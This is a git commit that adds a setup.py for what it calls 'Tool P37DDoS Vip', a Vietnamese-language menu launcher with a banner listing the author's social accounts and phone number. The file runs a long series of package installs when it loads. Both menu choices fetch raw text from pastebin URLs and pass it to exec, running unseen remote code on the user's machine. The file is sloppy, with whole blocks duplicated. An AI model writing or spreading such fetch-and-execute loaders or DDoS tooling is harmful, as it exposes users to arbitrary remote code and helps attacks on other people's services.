37f3b873b8002f615b18ed23931c16bbec9e4633
Phan Trung Trực ♪ <77790615+phantrungtruc@users.noreply.github.com>
2022-11-15 10:41:54 +0700

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,168 @@
+import os, sys,re,json,random
+from time import sleep
+import threading
+import sys
+import ssl
+import datetime
+import os, sys,re,json,random
+from time import sleep
+import threading
+import json,requests,time
+from time import strftime
+from datetime import date
+
+today = date.today()
+
+try:
+	import requests,pystyle
+except:
+	os.system('pip install requests && pip install bs4 && pip install pystyle')
+	
+def dk():
+   a= "\033[1;91m=\033[1;97m="*30
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+def delay(dl):
+  try:
+    for i in range(dl, -1, -1):
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [-]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [\]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [|]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [/]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [🔥]          ',end='\r')
+       sleep(0.2)
+  except:
+     sleep(dl)
+     print(dl,end='\r')
+s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
+r = "\033[1;97m▶▶\033[1;92m"
+sr = s+r+' '
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+def ra(a):
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+os.system('clear')                          
+def logo():
+    logo = """
+\033[1;32m╔═════════════════════════════════════════════════════════╗
+\033[1;32m║ \033[1;96m██████╗\033[1;91m ████████╗\033[1;95m   ➽ Facebook : Phan Bá Thông         \033[1;32m ║   
+\033[1;32m║ \033[1;96m██╔══██╗\033[1;91m╚══██╔══╝\033[1;94m  ➽ Zalo : 0384574058        ㅤ       \033[1;32m ║     
+\033[1;32m║ \033[1;96m██████╔╝\033[1;91m ㅤ██║\033[0;33m    ➽ Telegram : @thonguserr          \033[1;32m    ║   
+\033[1;32m║ \033[1;96m██╔═══╝\033[1;91mㅤㅤ██║\033[1;92m  ㅤㅤ➽ Youtube : P37Roy Official         \033[1;32m║    
+\033[1;32m║ \033[1;96m██║\033[1;91mㅤㅤㅤㅤ██║\033[1;97m        ➽ Bản Quyền By 🌍TMG✨           \033[1;32m ║    
+\033[1;32m╚═════════════════════════════════════════════════════════╝            """
+    ra(logo)
+
+dk()
+from pystyle import Box
+os.system('clear')
+logo()
+dk()
+
+sr="\033[1;31m [\033[1;92m●\033[1;31m]\033[1;97m ➺❥ \033[1;92m"
+
+print('Đang cài thư viện...')
+os.system('python --version')
+os.system('python -m pip install --upgrade pip')
+os.system('pip install requests')
+os.system('pip install request')
+os.system('pip install colorama')
+os.system('pip install bs4')
+os.system('pip install beautifulsoup4')
+os.system('pip install Anime')
+os.system('pip install selenium')
+os.system('pip install pyautogui')
+os.system('pip install keyboard')
+os.system('pip install input')
+os.system('pip install pystyle')
+os.system('pip install cursor')
+os.system('pip3 install requests pysocks')
+os.system('pip install requests pysocks')
+os.system('pip install screen git nodejs')
+os.system('pip install fake-useragent')
+os.system('pip install randomstring')
+os.system('pip3 install -r requirements.txt')
+os.system('pip install -r requirements.txt')
+os.system('clear')
+
+try:
+	import requests,pystyle
+except:
+	os.system('pip install requests && pip install bs4 && pip install pystyle')
+	
+def dk():
+   a= "\033[1;91m=\033[1;97m="*30
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+def delay(dl):
+  try:
+    for i in range(dl, -1, -1):
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [-]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [\]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [|]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [/]          ',end='\r')
+       sleep(0.2)
+       print(sr+'Chờ '+r+' '+str(i)+' Giây [🔥]          ',end='\r')
+       sleep(0.2)
+  except:
+     sleep(dl)
+     print(dl,end='\r')
+s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
+r = "\033[1;97m▶▶\033[1;92m"
+sr = s+r+' '
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+def ra(a):
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+os.system('clear')                          
+def logo():
+    logo = """
+\033[1;32m╔═════════════════════════════════════════════════════════╗
+\033[1;32m║ \033[1;96m██████╗\033[1;91m ████████╗\033[1;95m   ➽ Facebook : Phan Bá Thông         \033[1;32m ║   
+\033[1;32m║ \033[1;96m██╔══██╗\033[1;91m╚══██╔══╝\033[1;94m  ➽ Zalo : 0384574058        ㅤ       \033[1;32m ║     
+\033[1;32m║ \033[1;96m██████╔╝\033[1;91m ㅤ██║\033[0;33m    ➽ Telegram : @thonguserr          \033[1;32m    ║   
+\033[1;32m║ \033[1;96m██╔═══╝\033[1;91mㅤㅤ██║\033[1;92m  ㅤㅤ➽ Youtube : P37Roy Official         \033[1;32m║    
+\033[1;32m║ \033[1;96m██║\033[1;91mㅤㅤㅤㅤ██║\033[1;97m        ➽ Bản Quyền By 🌍TMG✨           \033[1;32m ║    
+\033[1;32m╚═════════════════════════════════════════════════════════╝            """
+    ra(logo)
+
+dk()
+from pystyle import Box
+os.system('clear')
+logo()
+
+dk()  
+print()
+print(sr+"Chọn [1] để quay lại Tool P37DDoS Vip")
+print(sr+"Chọn [2] để thoát Tool")         
+print()
+dk()
+abc = int(input(sr+"Nhập Số : "))
+dk()                                                              
+try:
+  if abc == 1:
+    exec(requests.get("https://pastebin.com/raw/W8x51Rep").text)
+  if abc == 2:
+    exec(requests.get("https://pastebin.com/raw/FDTt8TyX").text)
+
+except:
+   pass                  
